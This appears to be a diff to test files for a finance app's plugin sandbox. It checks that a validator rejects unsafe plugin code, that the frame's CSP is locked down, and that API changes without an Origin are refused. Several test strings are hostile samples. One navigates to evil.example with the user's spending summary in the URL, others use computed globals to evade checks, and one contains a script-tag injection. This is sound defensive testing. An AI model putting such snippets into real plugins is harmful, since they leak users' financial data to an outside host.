@@ -33,11 +33,20 @@ describe('validatePluginCode', () => {
     ['top window', `function render(r){ top.location = 'x' }`, 'plugin/no-frame-escape'],
     ['postMessage', `function render(r){ window.postMessage('x', '*') }`, 'plugin/no-frame-escape'],
     ['localStorage', `function render(r){ localStorage.getItem('fundbun') }`, 'plugin/no-storage'],
+    ['navigating its frame', `function render(r, d){ location = 'https://evil.example/?d=' + d.summary.spent }`, 'plugin/no-navigation'],
+    ['window.location', `function render(r){ window.location.href = 'https://evil.example' }`, 'plugin/no-navigation'],
+    ['a link clicked from code', `function render(r, d, h){ var a = h.el('a', { href: 'https://evil.example' }); r.appendChild(a); a.click() }`, 'plugin/no-navigation'],
+    ['a computed global', `function render(r){ self['loc' + 'ation'] = 'x' }`, 'plugin/no-global-lookup'],
     ['a closing script tag', `function render(r){ r.textContent = 1 } </script><script>alert(1)`, 'plugin/no-script-close-tag'],
   ])('refuses %s', (_label, code, rule) => {
     const r = validatePluginCode(code)
     expect(r.ok).toBe(false)
     if (!r.ok) expect(r.issues.map((i) => i.rule)).toContain(rule)
+  })
+
+  it('still allows data.history and a word like "location" in text', () => {
+    const code = `function render(root, data) { root.textContent = data.history.length + ' months, location: home' }`
+    expect(validatePluginCode(code)).toEqual({ ok: true })
   })
 
   it('ignores forbidden words inside strings and comments', () => {
@@ -144,6 +153,8 @@ describe('plugin frame', () => {
   it('blocks every network request', () => {
     expect(PLUGIN_FRAME_CSP).toContain("default-src 'none'")
     expect(PLUGIN_FRAME_CSP).toContain("connect-src 'none'")
+    // opened on its own (not in the app's iframe) it is still sandboxed
+    expect(PLUGIN_FRAME_CSP).toContain('sandbox allow-scripts')
   })
 })
 
@@ -197,6 +208,16 @@ describe('/api/plugins/* routes', () => {
       body: JSON.stringify({ enabled: true }),
     })
     expect(res.status).toBe(403)
+  })
+
+  it('refuse a change from a program that is not the app (no Origin)', async () => {
+    const plugins = createPluginService({ store: createPluginMemoryStore() })
+    const base = await start({ plugins })
+    const res = await fetch(`${base}/api/plugins/mode`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ enabled: true }) })
+    expect(res.status).toBe(403)
+    expect(plugins.isEnabled()).toBe(false)
+    // reading is fine
+    expect((await fetch(`${base}/api/plugins/state`)).status).toBe(200)
   })
 
   it('serve a widget frame with its own locked-down CSP', async () => {
